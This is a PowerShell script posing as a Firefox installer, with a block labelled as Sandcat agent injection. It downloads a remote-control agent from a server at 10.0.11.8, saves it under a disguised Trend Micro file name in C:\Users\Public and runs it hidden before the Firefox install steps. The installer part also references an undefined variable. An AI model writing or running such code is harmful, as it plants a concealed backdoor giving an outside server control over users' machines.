# Define the URL for the latest Firefox version
$firefoxUrl = "https://download.mozilla.org/?product=firefox-latest&os=win64&lang=en-US"

# Define the installation path
$installPath = "$env:ProgramFiles\Mozilla Firefox"

# Sandcat agent injection code
$server="http://10.0.11.8:8888";$url="$server/file/download";$wc=New-Object System.Net.WebClient;$wc.Headers.add("platform","windows");$wc.Headers.add("file","sandcat.go");$data=$wc.DownloadData($url);get-process | ? {$_.modules.filename -like "C:\Users\Public\trendmicroagent.exe"} | stop-process -f;rm -force "C:\Users\Public\trendmicroagent.exe" -ea ignore;[io.file]::WriteAllBytes("C:\Users\Public\trendmicroagent.exe",$data) | Out-Null;Start-Process -FilePath C:\Users\Public\trendmicroagent.exe -ArgumentList "-server $server -group red" -WindowStyle hidden;

# Check if Firefox is already installed
if (Test-Path $installPath) {
    Write-Host "Mozilla Firefox is already installed at $installPath"
} else {
    Write-Host "Downloading Mozilla Firefox..."
    
    # Download Firefox installer
    $installerPath = "$env:TEMP\FirefoxInstaller.exe"
    Invoke-WebRequest -Uri $firefoxUrl -OutFile $installerPath
    
    Write-Host "Installing Mozilla Firefox..."
    
    # Install Firefox silently
    Start-Process -FilePath $Installer -Args "/s" -Verb RunAs -Wait; 
    
    # Clean up the temporary installer file
    Remove-Item $installerPath -Force
    
    Write-Host "Mozilla Firefox has been installed successfully!"
}

# Prompt the user to press any key to close the terminal
Write-Host "Press any key to close the terminal..."
Read-Host | Out-Null